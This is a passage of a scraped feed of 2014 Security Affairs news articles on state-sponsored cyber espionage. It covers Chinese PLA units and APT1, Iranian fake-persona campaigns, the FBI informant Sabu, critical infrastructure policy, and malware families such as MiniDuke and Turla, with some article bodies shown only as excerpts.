Office to serve custom malware through spear phishing attacks.\n\n\u201cthere are several pieces of evidence to indicate that the activity tracked by Crowdstrike as PUttEr Panda is attributable to a set of actors based in China, operating on behalf of the Chinese People\u2019s liberation army (Pla). specifically, an actor known as cpyy (Chen Ping) appears to have been involved in a number of historical PUttEr Panda campaigns, during which time he was likely working in shanghai within the 12th Bureau, 3rd General staff department (Gsd).\u201d states the report.\n\nAccording to the revelation of official at NSA, more that 20 cyber units belonging to the People\u2019s Liberation Army are involved in cyber espionage campaigns on foreign high tech companies and research group.\n\nChina and US are exchanging reciprocal accusations for cyber espionage, a couple of weeks ago The Justice Department issued an indictment, which named five PLA members as responsible of espionage against US companies included Alcoa, Westinghouse Electric and the United States Steel Corporation. In response, the Chinese government denied the charges and announced retaliatory measures against US companies in trade with Chinese businesses.\n\nThe hackers anyway made some curious errors, for example, they registered websites used for the attacks with the same email address they used to register social media accounts.\n\n\u201cdomains registered by Chen Ping were used to control PUttEr Panda malware.

As explained by FireEye, the Iranian hacking groups are considered by US a very aggressive threat, they conducted numerous cyber attacks, sabotage and cyber espionage are their principal activities, groups like Ajax Security Team are responsible for different espionage campaigns on custom-built malicious software.\n\niSIGHT Partners revealed that Iranian hackers have used fake accounts in a cyber espionage campaign that is started at least four years ago.

At least 2,000 people/targets are, or have been, caught in the snare and are connected to the false personas.\u201d\n\nThe stealth campaign has targeted US Navy admirals, politicians, ambassadors, think tanks, defense contractors, senior government and military figures from different countries, including the Afghanistan, Iraq, Israel, Saudi Arabia, Syria, UK.\n\n\n\nThe bogus identities used by Iranian hackers claim to work in government, journalism and defense contracting, the attackers exploit the network of accounts, managing mutual interactions and relationship with victims\u2019 direct contacts. The attackers use a fictitious journalism website, newsonair.org, that reports news content from other legitimate media outlets.\n\nThe cyber espionage through social media platform is conducted articulating the activities of bogus identities that exactly as any other real person are linked to other accounts, promote \u201cfriendship\u201d with target victims, stimulate discussions on topics of interest.

They usually close on Saturday, Sunday and public holidays.\u201d\n\n\u201cWhat Exhibit F shows is a spike of activity on Monday through Friday around 8am in Shanghai (China Standard Time), a roughly 2-hour lull at lunchtime, and then another spike of activity from about 2pm to 6pm. The charts also show that there were very few changes in Dynamic DNS resolution on weekends.\u201d states FireEye.\n\nMandiant \u2013 FireEye experts are corroborating the evidence by releasing additional data not included in the APT1 report. The APT1 report included the following data, we specified the following:\n\nThe report APT1 did not originally include analysis of the time of day and day of the week that these 1,905 Remote Desktop (RDP) connections occurred. In the following char is evident that activities were conducted during Chinese business hours, in some isolated cases, APT1 members have worked during weekends.\n\n\n\n\n\n\nThe timestamp data used for the above analysis derived from active RDP logins over a two year period, it exactly matches the DOJ\u2019s timestamp data elaborated from a different source.\n\n\u201cThese data sets show that APT1 is either operating in China during normal Chinese business hours or that APT1 is intentionally going to painstaking lengths to look like they are. \u201c\n\nThe \u201cattribution\u201d of responsibility for a cyber attacks is very difficult, and also this last collection of data are not sufficient to exclude that a third government has used same means and method typically associated with China-based hackers. The fact that hackers have worked in Chinese business hours is a further evidence, but intelligence of any other government could have easily used it as a diversionary strategy.\n\nGiven this, it is clear that all the evidence collected so far leaves no doubt about the nature of the attacks.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  FireEye, APT1)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt1", "topic_name": "APT1"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fireeye", "topic_name": "FireEye"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mandiant", "topic_name": "Mandiant"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pls", "topic_name": "PLS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/unit-61398", "topic_name": "Unit 61398"}]}, {"news_name": "5 Chinese PLA officials accused of cyber espionage on US companies", "news_link": "https://securityaffairs.co/wordpress/25070/cyber-crime/pla-officials-accused-hacking.html", "title": "5 Chinese PLA officials accused of cyber espionage on US companies\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 20, 2014", "body": "Defendants :  Wang Dong, Sun Kailiang, Wen Xinyu, Huang Zhenyu, and Gu Chunhui, who were officers in Unit 61398 of the Third Department of the Chinese People\u2019s Liberation Army (PLA).

The situation is quite similar in other airports in the area.\n\n\u201cIn a statement, the FAA acknowledged that its air traffic system, which processes flight plan information, \u201cexperienced problems while processing a flight plan filed for a U-2 aircraft that operates at very high altitudes under visual flight rules.\u201d\u201d report the NBC News.\n\n\u201cThe computer system interpreted the flight as a more typical low altitude operation, and began processing it for a route below 10,000 feet,\u201d said the FAA in its statement.\n\n\u201cThe extensive number of routings that would have been required to de-conflict the aircraft with lower-altitude flights,\u201d  \u201cused a large amount of available memory and interrupted the computer\u2019s other flight-processing functions.\u201dsaid the FAA,\n\nAs resultant after the passage of the U-2 spy plane the FAA had to stop accepting flights into airspace managed by the affected L.A. Center for about an hour,\n\nFAA has adopted all the countermeasures to fix the problem, the affected system requires \u201cspecific altitude information for each flight plan,\u201d and the agency confirmed that facilities that use the computer system to significantly increase the amount of flight-processing memory available.\n\nWhat is happening is still a mystery, how is it possible that the U-2 spy plane has affected the control systems? Anyway, let me suggest you to read my post \u201cCyber Threats against the Aviation Industry\u201d in which I have detailed possible threats to the aviation industry.\n\nI have proposed the case to raise a reflection on the possible effects on a cyber weapon on air traffic systems.

In many cases we discussed the possibility to exploit hacktivism to support military operations against a foreign government, the US intelligence was accused to have infiltrated popular collectives of hacktivists to coordinate attacks on foreign governments including Iran, Syria, Pakistan and Brazil.\n\nAccording declarations of participant to the attacks, the group of hackers exploited a vulnerability in a popular web hosting software to steal sensitive information from the government servers. All the information collected during the offensives were uploaded on a server monitored by the FBI according to court statements.\n\n\u201cThe details of the 2012 episode have, until now, been kept largely a secret in closed sessions of a federal court in New York and heavily redacted documents. While the documents do not indicate whether the F.B.I. directly ordered the attacks, they suggest that the government may have used hackers to gather intelligence overseas even as investigators were trying to dismantle hacking groups like Anonymous and send computer activists away for lengthy prison terms.\u201d reported the New Youk Times.\n\nHector Xavier Monsegur, aka Sabu, was one of the leaders of the popular group of hacktivists LulzSec that breached many high profile targets during in the last years, including Sony Pictures (2011). The group also claimed responsibility for taking down many other notorious targets such as  AT&T, Viacom, Disney, EMI, and NBC Universal, The Sun, PayPal, MasterCard, The Times and the CIA.\n\nSabu once arrested decided to collaborate with law enforcement to track down other members of Anonymous. Various members of the popular group of hacktivists have been identified and arrested. \n\nThanks Monsegur, F.B.I. arrested another popular hacktivist, Jeremy Hammond that joined in the group of hackers known as Antisec. Hacktivist Jeremy Hammond was sentenced to 10 years in federal prison, he collaborated with Monsegur to conduct the attack on the private intelligence firm Stratfor.\n\n\n\nDuring the process Hammond declared that FBI coordinated numerous attacks of Anonymous on foreign governments, after the Stratfor hack in fact Monsegur began supplying Hammond with lists of foreign vulnerable websites representing the targets of the offensives. The collective of hackers led by Mr. Hammond exploited a zero-day vulnerability in the web-hosting software Plesk to install a backdoor into thousands of websites and gaining their complete control.\n\nThe attack pattern was quite similar, once installed the backdoor on the target, sensitive data like emails and databases were extracted and uploaded to a computer server controlled by Monsegur.\n\n\u201cMr. Hammond would not disclose the specific foreign government websites that he said Mr. Monsegur had asked him to attack, one of the terms of a protective order imposed by the judge. The names of the targeted countries are also redacted from court documents.\u201d\n\nThe list included more than 2,000 Internet domains, Monsegur directed Mr. Hammond to hack government websites in Iran, Nigeria, Pakistan, Turkey and Brazil and other government sites, including the Ministry of Electricity in Iraq.\n\nThe sentencing statement confirmed the involvement of Mr. Monsegur in the attacks against Syrian government websites, including banks and ministries of the government of President Bashar al-Assad.\n\n\u201cThe F.B.I. took advantage of hackers who wanted to help support the Syrian people against the Assad regime, who instead unwittingly provided the U.S. government access to Syrian systems,\u201d the statement said.\n\nAccording Hammond, Mr. Monsegur never carried out the hacks himself:\n\n\u201cSabu wasn\u2019t getting his hands dirty,\u201d said Hammond.\n\nThe exact role of the FBI is still unclear, the involvement of groups of hackers capable to hit any target on the Internet is a known and efficient strategy adopted by governments.  Characters like Mr. Monsegur can influence large masses of hacktivists that taking part to a cyber attack support a tactical operation of the US government.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Hacktivist, Monsegur)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fbi", "topic_name": "FBI"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivist", "topic_name": "hacktivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hector-xavier-monsegur", "topic_name": "Hector Xavier Monsegur"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/law-enforcement", "topic_name": "law enforcement"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/lulzsec", "topic_name": "LulzSec"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/psyops", "topic_name": "PsyOps"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabu", "topic_name": "Sabu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stratfor", "topic_name": "Stratfor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/syria", "topic_name": "Syria"}]}, {"news_name": "Critical Infrastructure security, is it possible a shared regulatory?", "news_link": "https://securityaffairs.co/wordpress/24191/cyber-crime/critical-infrastructure-security-possible-shared-regulatory.html", "title": "Critical Infrastructure security, is it possible a shared regulatory?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 21, 2014", "body": "Security of critical infrastructure is a critical urgency of any government, the NIST announced the Framework for Improving Critical Infrastructure Security, a document that proposed cybersecurity standards and practices to build out a security program.\n\nThe cybersecurity framework for critical infrastructure proposed by the US Government is a \u201cliving document\u201d to improve internal security of the structures in the country. Security industry has observed in the last years that the number of high-profile attacks such as Stuxnet and Shamoon has reached unprecedented levels, alerting politicians and Intelligence agencies on the possible risks related to a cyber offensive against these vital systems.\n\nUtilities, transportation systems, telecommunication systems, power grids, are just some example of critical environment where networks and infrastructure use arcane software not aligned with modern requirements in term of security.\n\n\n\nKaspersky, the CEO of Kaspersky Lab, expressed during an interview at the last KAspersky Cyber Security Summit many doubts about the methods pursued to date, he is skeptical about any international effort to develop global recognized standards.\n\n\u201cI vote for less regulation in technology and innovation,\u201d \u201cThe older I am, the less and less I believe in international projects. Let the nations do it themselves, and they can be an example for the rest of the world. I think the United States will be first and then the rest of the world can copy and paste.\u201d he said.\n\nEugene Kaspersky is stressing security industry for a long time alerting on the possible risks of a major attack on a critical infrastructure, but he is convinced that there is too much still to do to address the growing cyber threats.\n\nKaspersky is convinced that assigning to each government the responsibility for definition of necessary countermeasures to mitigate cyber threats will help to create the condition for a healthy competition that could give rise to innovative projects.\n\n\u201cIf you have many competing companies there\u2019s much more chance that one of these will come up with something innovative. I vote for competition. I believe in a world that has independent and competing businesses,\u201d \u201cThere\u2019s a much better chance that the right answer will be found much faster.\u201d  Kasperky said.\n\nThe software running on computers within critical infrastructure in many cases lacks of security by design, and haven\u2019t been subjected to any kind of security testing. To give you an example consider that during the last S4x14 Conference in Miami, Luigi Auriemma of ReVuln disclosed a serious vulnerability in HMI software. The team of researchers at ReVuln discovered a buffer overflow vulnerability in the company\u2019s IntegraXor Web-based HMI software, a software designed by the Malaysian SCADA company Ecava.\n\nWe must consider that despite we all agree on the risks related to a possible attack against critical infrastructure, there\u2019s still a lot of disagreement in the industry about the terms used to qualify these critical systems.\n\nContrary to Kaspersky\u2019s thought to leave each government the responsibility of its infrastructure, policymakers and politics led to calls for regulation and standardization for security. It is an hard challenge, each actor involved in the creation of standards and regulations must be properly recognized.\n\nAs remarked by ThreatPost, one of the principal problems related to security of SCADA and critical infrastructure is that the majority of them is owned and managed by private companies.\n\n\u201cThe government has no critical infrastructure of its own. It relies on the private sector for that, and when it goes down, the government goes down,\u201d \u201cNational security and economic security are intertwined.\u201d said Tom Ridge, the former secretary of the Department of Homeland Security and former governor of Pennsylvania.\n\nWhich are privileged targets for cybercriminals and state-sponsored hackers?\n\nKaspersky confirmed that US infrastructure is at the top of the target list for hackers.\n\n\u201cIt\u2019s very difficult to compare who is better protected. The U.S. is the most developed IT country in the world,\u201d\u201cIt has many more SCADA systems than any other country, so the U.S. is the biggest target. But it also has the most resources. So which nation is better protected, the one with all of the systems and resources or the one with fewer systems and is a smaller target?\u201d  he said. \n\nI also remark that it is quite easy to find online information and tools necessary for an attack against SCADA systems, let\u2019s think for example of the simplicity to find online SCADA components through the Shodan search engine. Once identified the targets the next step is to choose the weapons and the underground offer a huge collection of exploits to hit the targets.\n\n\u201cOur critical infrastructure continues to be at risk from threats in cyberspace, and our economy is harmed by the theft of our intellectual property,\u201d \u201cAlthough the threats are serious and they constantly evolve, I believe that if we address them effectively, we can ensure that the Internet remains an engine for economic growth and a platform for the free exchange of ideas.\u201d are the words used by President Obama to describe the critic of the topic.\n\nTime is running out \u2026. cyber security for critical infrastructure is a must!\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Critical Infrastructure, Kaspersky)\n\n\n\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/authentication", "topic_name": "authentication"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/enisa", "topic_name": "ENISA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kaspersky", "topic_name": "Kaspersky"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-2", "topic_name": "security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/shodan-search-engine", "topic_name": "Shodan search engine"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day-vulnerabilities", "topic_name": "zero-day vulnerabilities"}]}, {"news_name": "Cyber warriors fought between the government and the security industry", "news_link": "https://securityaffairs.co/wordpress/24083/cyber-crime/cyber-warriors-for-security-industry.html", "title": "Cyber warriors fought between the government and the security industry\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 17, 2014", "body": "Cyber security is officially one of the first targets of every government, many countries announced huge investments to improve their cyber capabilities, a great effort that is having a significant impact on budgets and politics.\n\nThe Military Cyber Spending reserved by the Pentagon for cyber operations next year is $5 Billion, part of the comprehensive $496 billion fiscal 2015 budget, the U.S. Secretary of Defense Chuck Hagel recently announced that US Army plans to triple its cybersecurity staff by 2016.\n\n\u201cA fund spending within the $5.1 billion Military Cyber Spending will be reserved for cyber operations to go toward the continued development of 133 special cyber mission teams. A critical goal, of course, is the improvement on defense for critical infrastructure against internet-based attacks, The Pentagon has estimated that the number of cyber mission team staffers in place by 2016 will reach 6,000 units, including 13 national mission teams with eight national support teams.\u201d I\u2019ve written in a previous article.\n\nNot only Information Warfare, one of the primary goal is the fight to the cybercrime, FBI Supervisory Special Agent Charles Gilgen announced that his agency\u2019s cyber division plans to hire 1,000 agents and 1,000 analysts in the coming twelve months.\n\nThe overall number of cyber experts that will be recruited in the next two years is 6,000 people, and to mitigate the shortage of experts the government is also trying to sustain training programs starting from the universities.  A Government program started in 2000, codenamed CyberCorps, promotes a series of activities to develop cyber security capabilities within the schools.\n\nParticipants must be US citizens and could receive a cash stipend up to $30,000 a year, \u201cdepending on whether the student is pursuing a bachelor\u2019s, a master\u2019s, or a doctorate\u201c, once completed their studies the youngsters serve in Government for the same length of time as they received funding.\n\n\n\nDespite all these initiatives, the  US Government has to face with another serious problem, the migration of highest cyber skills from government agencies to private industries, the talents are of course attracted by higher earnings in the private sector.\n\n\u201cIf you couldn\u2019t break $100,000 as a starting salary, I think you\u2019d have trouble attracting those guys,\u201d said Golden Richard, a professor with the University of New Orleans Information Assurance Program.\n\nThe young cyber experts prepared thanks to government programs are immediately recruited by private industry that is willing to spend that much more enticing figures for specific knowledge in cyber security.\n\nThe cyber shortage is also responsible for massive recruitment of contractors in the cyber security sector and Intelligence, but the downside is the increased risks related to the possible disclosure of sensitive or classified material. The Snowden\u2018s case has shocked the world Snowden, seriously injuring the U.S. Intelligence structure, its impact has led and will lead to a revolution in US Intelligence.\n\nSnowden\u2018s revelations are the causes of a dangerous disaffection in a machine responsible for the Homeland Security, many students have argued their grip away from their training programs citing the case of the popular whistleblower.\n\nGet ready, probably the cyber security landscape is set to change profoundly in the next two years and opportunity for all the professionals like me that \u201clive for security\u201d.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Security,  Intelligence)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-capabilities", "topic_name": "cyber capabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-wariors", "topic_name": "cyber wariors"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercorps", "topic_name": "CyberCorps"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pentagon", "topic_name": "Pentagon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/snowden", "topic_name": "Snowden"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us-intelligence", "topic_name": "US Intelligence"}]}, {"news_name": "Raoul Chiesa \u2013 from cybercrime to state-sponsored hacking", "news_link": "https://securityaffairs.co/wordpress/23956/cyber-crime/raoul-chiesa-bad-actors-cyberspace.html", "title": "Raoul Chiesa \u2013 from cybercrime to state-sponsored hacking\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 14, 2014", "body": "Next week the forth Cybercrime Conference will be held in Rome (http://www.tecnaeditrice.com/eventi/cyber_crime_conference_2014/presentazione), two days in which top experts in the field will analyze high-profile cyber attacks discussing also about legal issues, privacy, and cyber strategies implemented by different kind of attackers.\n\nI took the opportunity to interview one of the foremost experts in the world of cyber security, Raoul Chiesa. Finding a definition for Raoul is impossible, someone called him a hacker, others expert, but my only certainty is that Raoul is one of those characters that \u201cmakes security\u201d.\n\n\n\nFollowing my short interview to Raoul:\n\nWhich is the impact of Snowden\u2018s case on the state-sponsored hacking? Starting from the consideration that International law framework on hacking must be reviewed, do you think that governments will be more interested to promote a regulatory for hacking campaigns or they will try to improve their cyber capabilities or continuing to conduct even more complex cyber operations?\n\nRaoul Chiesa : Snowden\u2018s revelations definitely ran a huge impact on the Intelligence world. My feeling is that we still have to wait in order to fully realize how much those leaks will impact on the whole world. Also, I don\u2019t really think we will have a legal framework on hacking, since right now each country is acting in their own way (see USA, India, UK, and the Netherlands, from different perspectives, i.e. Intelligence VS Law Enforcement).\nOn the other hand, just as you said, each Government will improve its own cyber capabilities. It\u2019s much alike the time of the Cold War, don\u2019t you think so?\n\nMikko Hypponen during the recent TrustyCon conference declared that there is the risk that a Government-built malware and cyber weapons will run out of control. What\u2019s your opinion on the topic? Which is the most feasible scenario in the next couple of years?\n\nRaoul Chiesa : Well, this already happened, if you think about Stuxnet: it ran out different of control, infecting targets in different countries, not just the target one. Cyberweapons \u2013 while not regulated at this time, by no one \u2013 are an extremely critical asset to deal with.\nOften, when speaking at public and private events, rather than train different MoDs, I highlight something which is very important in my opinion: those tools, techniques and approaches used by the Information Warfare and Black Ops scenarios, are basically coming from the Cybercrime, more or less. This means that, just as it happens with Cybercrime tools, the infection vectors (i.e. Malware) will impact on a target which will be different from the one originally planned.\nThe most feasible scenario I do see in the next couple of years is a \u201cFar West\u201d one. The only way we can avoid this, is through regulations, and international agreements. Here I think the United Nations should play a strong role, and the NATO as well, just as it happens when dealing with the \u201cstandard\u201d peacekeeping and weapons proliferation control.\nWhat I think it\u2019s kind of weird, though, is that just a few security experts, such as Mikko, Marcus Ranum, myself and a few others, are public speaking about this. And, the silence of the EU is definitely embarrassing.\n\nIs the availability of Government-built malware in the wild impacting the offer in the underground? (e.g. Cyber criminal gangs that are able to make reverse engineering of malicious code to resell it to other governments)\n\nRaoul Chiesa : Here we are speaking about something which is really weird as well. The main customers of the Cybercrime, when speaking i.e. about 0-days, C&C centers, malware writing, are Governments. No matter if it\u2019s about Intelligence agencies rather than MoDs, that\u2019s a true fact. Once again, this is something which is already happening. It happened with Stuxnet, as far as I know: I learned from different colleagues that two different Ukraine-based malware factories were behind the coding of Stuxnet, acting just like \u201csub-contractors\u201d for the US and Israel Governments.\nAlso, whenever we\u2019re speaking about \u201cState-Trojans\u201d and Lawful Interception, well\u2026. Governments (Intelligence Agencies, MoDs, and Law Enforcement Agencies) are doing  business with private companies \u2013 think about the \u201cSpy Files\u201d leak \u2013 which are buying 0days and vulnerabilities from the so-called hacking underground and, sometimes, from the Cybercrime market itself. Even if they will never admit this last point.\n\nIs it possible a convergence between cybercrime and state-sponsored hacking? Which scenarios do you consider most plausible?\n\nRaoul Chiesa : Just as I mentioned above, this scenario is already ongoing. Well, we should then also give a better definition, and insights, about what you name under the umbrella of \u201ccybercrime\u201d.\nToday\u2019s hacking world is composed by a plethora of different actors (think about the Hacker\u2019s Profiling Project I started along with great colleagues at UNICRI back in 2004), which interact in different ways, while \u201ccoming from\u201d and \u201cbelonging\u201d to very different worlds. Also, think about what happened \u2013 and is still happening \u2013 in Ukraine, from a state-sponsored hacking perspective, plus what happened back in Estonia and Georgia. Gleb from UISG (Ukraine Information Security Group) released a great presentation, with very critical insights, back at a APWG.EU event a few weeks ago: Governments should read that presentation, analyze those facts and data, and learn from the lesson.\n\nDo you consider realistic the possibility of a major cyber attack against a western critical infrastructure in the medium term? Which will be means and motivations?\n\nRaoul Chiesa : I do consider this possible: from a technical perspective, it can already be done, now. The means would be standard vulnerabilities, both public or private ones. Entry points and attack scenarios could vary, depending on the target itself, and on the resources of the attackers (time, budget).\nSpeaking about motivations, what do I see right now are economic ones. I don\u2019t believe that much in what the media and propaganda is telling us about the so-called cyberterrorism and so on. What I mean is that, luckily, the very bad guys (terrorists) haven\u2019t yet well understood the possibilities and plausible attack scenarios that IT and TLC would allow them to abuse with. This is a good thing, tough, and it\u2019s up to the security communities to be able to speak with, educate, aware, and teach to the decision makers in different areas, what\u2019s the real status nowadays, and what may happen.\n\nDoes common people have a concrete means to protect their own privacy? In the name of security is really necessary to give up the privacy?\n\nRaoul Chiesa : First of all, the concept of \u201cprivacy\u201d vary a lot among countries and areas of the world. All of us, we know that the concept of privacy is much different between US and EU, for example.\nI\u2019ve really enjoyed Mikko Hypponen\u2019s talk at TED Bruxelles some months ago, especially the last part. He said that privacy is one of the basics when speaking about democracy, while referring to the NSA affair. People are users, and users look like they really don\u2019t understand yet what the privacy is all about. They post personal information and data on social media, thet connect to every kind of \u201cfree\u201d access point and wifi hotspots, they do not encrypt critical data such as their PIN and credit card number, when storing them on their PCs and Smartphones.\nWe need the people to get educated. I think that, on this topic, we do have a lot of associations and projects which are doing a great job: I think about APWG, ENISA, CLUSIT in Italy (and, CLUSIF in France, CLUSIS in Switzerland, etc), many EU-funded research projects such as ACDC and Cyberoad, and a lot of so-called \u201cunderground\u201d conferences, such as Hack in the Box AMS, CONFidence, St.Hack, ATHCon, just to mention some of the biggest and smallest we have in Europe.\nOn the other hand, security needs sacrifices, it isn\u2019t an easy mission to accomplish. We must give up on something, if we want to rise up the security level around us.

The report consolidated data on principal cyber threats and also highlights emerging global threat actors targeting different industries. \n\nThe threats are even more sophisticated, organizations face increasing difficulties to identify the threats and discover a breach on their systems. The industries that most of all have suffered attacks are Financial Services and Media & Entertainment.\n\n\n\n \n\nHow wondering on how companies find that they have been violated, 33% of victims discovered the breach internally (Down from 37% in 2012) while 67% of victims were noti\ufb01ed by an external entity. Despite the number of days that threat agents were present on a victim\u2019s network before detection is decreasing (14 days less than 2012), its median number is 229. This data are really scaring in my opinion, bad actors are able to remain undetected within networks of their victims for more than eight months.\n\n\u201cIt is hard to overstate how quickly cybersecurity has gone from a niche IT issue to a consumer issue and boardroom priority,\u201d \u201cOver the past year, Mandiant has seen companies make modest improvements in their ability to attack the security gap. On the positive side, organizations are discovering compromises more quickly, but they still have difficulty detecting said breaches on their own. It is our focus to bridge that gap and continue the positive trends our customers are seeing.\u201d  said Kevin Mandia, SVP and COO, FireEye.\n\nPhishing is confirmed as one of most insidious cyber threat, attackers prefer to exploit trust in IT departments, curious that the majority of attacks occurs in the same days of the week on Tuesday, Wednesday and Thursday.\n\n\u201c44% of observed phishing emails were IT related, often attempting to impersonate the targeted company\u2019s IT department\u201d\n\nAnother interesting aspect in the current threat landscape is the increasing for the effect of political conflicts on private organizations, let consider, for example the effect related to the numerous attacks conducted by members of the Syrian Electronic Army (SEA).\n\nThe report dedicates a session on suspected Iran-based threat actors, the hackers appear to be interested to systems and infrastructures of the energy sector and state governments. Mandiant has identified activities that may be attributable to reconnaissance operated by unknown attackers.\n\nThe experts at Mandiant hypothesized that that Iranian attackers are state-sponsor hackers conducting surveillance activities, their operations appear less complex than other nation-state actors, but anyway it is important to monitor them.\n\nIran-based actors used a small set of off-the-shelf tools and a few custom tools which are the result of re compilation of other malicious exploit publicly available. The attackers haven\u2019t used zero-day exploits or custom-written exploits.\n\n\u201cThe majority of these suspected Iran-based actors targeted the energy sector. We have also seen these threat actors target the networks of several U.S. state government agencies.\u201d states the M-Trends 2014 Threat Report.\n\n\n\nLet\u2019s close the post with a look to Chinese state-sponsored hackers, one year after Mandiant discovered the Chinese cyber espionage group named APT1, it has confirmed that both APT hacking groups, APT1 and APT2, are still active and have resumed their operations.\n\n\n\nYou just have to read it!\n\nPierluigi Paganini\n\n(Security Affairs \u2013  M-Trends 2014 Threat Report, Mandiant)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/fire-eye", "topic_name": "Fire Eye"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/m-trends-2014-threat-report", "topic_name": "M-Trends 2014 Threat Report"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mandiant", "topic_name": "Mandiant"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/phishing", "topic_name": "phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sea", "topic_name": "SEA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day", "topic_name": "zero-Day"}]}, {"news_name": "F-Secure has discovered MiniDuke malware samples in the wild", "news_link": "https://securityaffairs.co/wordpress/23658/cyber-crime/f-secure-new-miniduke-atp.html", "title": "F-Secure has discovered MiniDuke malware samples in the wild\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 3, 2014", "body": "The documents explicitly refer political issues like the recent crisis in the Ukraine or NATO informative in the attempt to circumvent the victims, F-Secure reported, for example, the existence of a bogus document signed by Ruslan Demchenko, the First Deputy Minister for Foreign Affairs of Ukraine.\n\n\u201cThe letter is addressed to the heads of foreign diplomatic institutions in Ukraine.

Experts at BAE Systems Applied Intelligence, who discovered the Snake campaign, have linked the platform to the Uroburos rootkit, another malware used for the same purpose and discovered by the German firm G Data. Researchers at BAE also discovered another piece of malware named Turla, their opinion is that the malicious code was developed by a Russian cyber specialists, probably all these instances are part of a cyber weapon program of the Government of Moscow.\n\nThe Snake cyber espionage campaign remained undetected for a log time, at least for eight years, the researchers also found a link to older pieces of malware Agent.btz, a worm which infected US military networks several years ago. According Kaspersky, Lab the Agent.btz was discovered on nearly 13,800 systems across 100 countries in 2013.\n\n\n\nTurla seems to have been designed by Russian-speaking authors, exactly like the predecessor Agent.btz and the malicious code used for the Red October cyber espionage campaign. Researchers discovered that Turla uses the same XOR key and log file names as Agent.btz, but we have to consider that it could be a diversionary strategy of the malware authors. \n\nThe details of the Agent.btz agent have been known publicly for a long ago, many reports provide information regarding the name of the files used, including the specific log file names, and even the XOR key.\n\n\u201cThe connection between Turla and Agent.btz is more direct, although not sufficiently so to conclude that the two programs have the same origin. Turla uses the same file names as Agent.btz \u2013 \u201cmswmpdat.tlb\u201d, \u201cwinview.ocx\u201d and \u201cwmcache.nld\u201d for its log files stored on infected systems.\u201d  said Aleks Gostev, Chief Security Expert at Kaspersky Lab\n\nResuming both Turla and Agent.btz have files with identical names, but the surprise is the presence of a file called \u201cthumb.dd\u201d present in both Turla and Red October malware.\n\n\u201cWe cannot make such a conclusion based only on the listed facts\u201d,\u201cAll the information used by developers was 